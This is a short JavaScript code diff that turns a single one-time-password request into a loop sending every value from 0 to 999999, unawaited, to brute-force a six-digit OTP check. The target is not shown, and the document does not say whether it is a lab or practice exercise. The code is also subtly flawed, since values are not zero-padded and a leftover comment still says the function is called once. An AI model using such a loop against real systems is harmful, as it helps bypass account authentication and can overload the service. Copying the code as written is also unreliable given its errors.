@@ -26,7 +26,10 @@ async function sendRequest(otp) {
 }
 
 async function main() {
-  await sendRequest("210116"); // Call the sendRequest function once
+  for (let i = 0; i <= 999999; i++) {
+    console.log(i);
+    sendRequest(i.toString());
+  } // Call the sendRequest function once
 }
 
 main();
